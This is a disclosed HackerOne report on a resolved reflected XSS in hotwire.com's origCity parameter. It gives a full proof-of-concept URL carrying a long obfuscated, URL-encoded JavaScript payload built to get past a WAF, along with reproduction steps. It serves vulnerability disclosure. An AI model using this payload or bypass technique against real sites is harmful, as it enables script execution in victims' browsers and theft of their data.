---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1420529'
original_report_id: '1420529'
title: Reflected XSS Via origCity Parameter (UPPER Case + WAF Protection Bypass)
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: expediagroup_bbp
created_at: '2021-12-08T18:10:28.212Z'
disclosed_at: '2023-05-04T21:13:24.365Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 58
asset_identifier: www.hotwire.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS Via origCity Parameter (UPPER Case + WAF Protection Bypass)

## Metadata

- HackerOne Report ID: 1420529
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: expediagroup_bbp
- Disclosed At: 2023-05-04T21:13:24.365Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

##Summary

The Injection occurs on an `onsubmit` event, this will require an extra click, however this page is vulnerable to clickjacking as well, this makes a little bit more easier to exploit

{F1538302}

## Steps To Reproduce:

1->Open

https://www.hotwire.com/air/search-options.jsp?inputId=ext-link-disambig&rs=0&isMultiAirport=true&startDate=12%2F09%2F21&endDate=12%2F12%2F21&noOfTickets=1&origCity=xss;%27}}),%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%5b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%28%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%2b%5b%21%5b%5d%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%21%2b%5b%5d%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%2b%28%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%5b%2b%21%2b%5b%5d%5d%29%29%5b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%5b%5d%2b%5b%5d%29%5b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%5b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%28%2b%5b%5d%29%5b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%5b%5d%5b%5b%5d%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%2b%5b%2b%21%2b%5b%5d%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%5d%5d%28%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%29%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%29%28%29%28%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%2b%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%5d%2b%5b%2b%21%2b%5b%5d%5d%2b%28%5b%2b%5b%5d%5d%2b%21%5b%5d%2b%5b%5d%5b%28%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%5d%2b%28%21%5b%5d%2b%5b%5d%29%5b%2b%21%2b%5b%5d%5d%2b%28%21%21%5b%5d%2b%5b%5d%29%5b%2b%5b%5d%5d%5d%29%5b%21%2b%5b%5d%2b%21%2b%5b%5d%2b%5b%2b%5b%5d%5d%5d%29//&destinationCity=

2-> Click `Continue`


---

## Recommended Remediation Steps 

Block single quotes

---

This could be a duplicate, but i think i might be able to escalate this if not

## Impact

A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
